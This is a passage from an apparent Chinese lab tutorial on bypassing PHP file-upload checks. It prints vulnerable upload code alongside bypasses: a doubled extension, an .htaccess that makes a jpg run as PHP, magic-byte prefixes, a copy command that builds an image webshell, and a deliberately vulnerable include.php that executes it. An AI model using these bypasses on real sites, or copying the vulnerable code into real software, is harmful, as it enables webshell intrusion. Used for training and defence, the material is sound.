class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>我们这里构造文件名为<code>test.pphphp</code>，这样消除之后就会变成<code>test.php</code>，会把所有带php的文件名和扩展名进行消除</p>
<h5 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传.htaccess</h5><p>​        .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>服务器禁止了几乎所有的类型文件的后缀，可以通过.htaccess解析进行绕过</p>
<p>上传.htaccess文件，.htaccess文件代码如下</p>
<p>下面代码说明服务器解析1.jpg文件当作php运行，也可以不加1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;1.jpg&quot;&gt;  </span><br><span class="line">SetHandler  application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatchc&gt;</span><br></pre></td></tr></table></figure>

<p>当把有如上代码的.htaccess文件上传，在上传有木马代码的1.jpg文件上传，即可使用工具链接</p>
<h3 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h3><h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>这里主要对文件的前两个字节来判断文件的上传类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下，</p>
<p>要绕过jpg文件幻数检测就要在文件开头写上下图的值：</p>
<p>Value = FF D8 FF E0 00 10 4A 46 49 46</p>
<p><img src="https://upload-images.jianshu.io/upload_images/15378294-c22107455ddd7217.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/639/format/webp"></p>
<p>要绕过gif 文件幻数检测就要在文件开头写上下图的值</p>
<p>Value = 47 49 46 38 39 61</p>
<p><img src="https://upload-images.jianshu.io/upload_images/15378294-5b20d65ed7622052.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/607/format/webp"><br>要绕过png 文件幻数检测就要在文件开头写上下面的值</p>
<p>Value = 89 50 4E 47</p>
<p><img src="https://upload-images.jianshu.io/upload_images/15378294-d22290e70f64e241.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/589/format/webp"></p>
<p>然后在文件幻数后面加上自己的一句话木马代码就行了</p>
<p><strong>绕过方法</strong></p>
<p>准备一张普通的图片和一句话木马</p>
<p>在命令控制行输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy image.jpg/b+test.php/a test.png</span><br></pre></td></tr></table></figure>

<p>生成的test.png就是我们制作好的图片马，上传即可</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure>



<h4 id="突破getimagesize"><a href="#突破getimagesize" class="headerlink" title="突破getimagesize()"></a>突破getimagesize()</h4><p>通过<code>getimagesize()</code>函数获取文件类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = &#x27;.jpeg|.png|.gif&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext)&gt;=0)&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>准备一张普通的图片和一句话木马</p>
<p>在命令控制行输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy image.jpg/b+test.php/a test.png</span><br></pre></td></tr></table></figure>

<p>生成的test.png就是我们制作好的图片马，上传即可</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure>



<h4 id="突破exif-imagetype"><a href="#突破exif-imagetype" class="headerlink" title="突破exif_imagetype()"></a>突破exif_imagetype()</h4><p>通过exif模块检测文件的类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>准备一张普通的图片和一句话木马</p>
<p>在命令控制行输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy image.jpg/b+test.php/a test.png</span><br></pre></td></tr></table></figure>

<p>生成的test.png就是我们制作好的图片马，上传即可</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure>



<h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>这里综合判断了后缀名、content-type，以及利用<code>imagecreatefrompng</code></p>
<p>判断是否为图片，最后再做了一次二次渲染</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>准备一张图片，上传，再把上传之后的图片再次上传</p>
<p>通过工具对比三种图片的十六进制，我们确定这里对文件头部信息，文件扩展名，<code>content-type</code>对文件类型进行检测</p>
<p>如果该文件在规则设置之内，则通过模块<code>imagecreatefrompng</code>对文件内容进行二次渲染，然后重命名上传</p>
<p>我们通过对比三张图片，可以确定不被渲染的文件头部分和被渲染的主体部分</p>
<p>我们把一句话代码插入到文件头中，这样就不会被渲染掉</p>
<p>这里注意插入代码的位置，如果插入点正好是检测文件类型的那一部分，会导致判断不出文件类型，从而拦截</p>
<p>所以插入点位置尽量靠后，并且在冒号之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比如代码插入到了xxx(代码):xxx</span><br><span class="line">可能会被检测到文件类型异常</span><br><span class="line">需要手动修改为xxx:(代码)xxx</span><br></pre></td></tr></table></figure>

<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

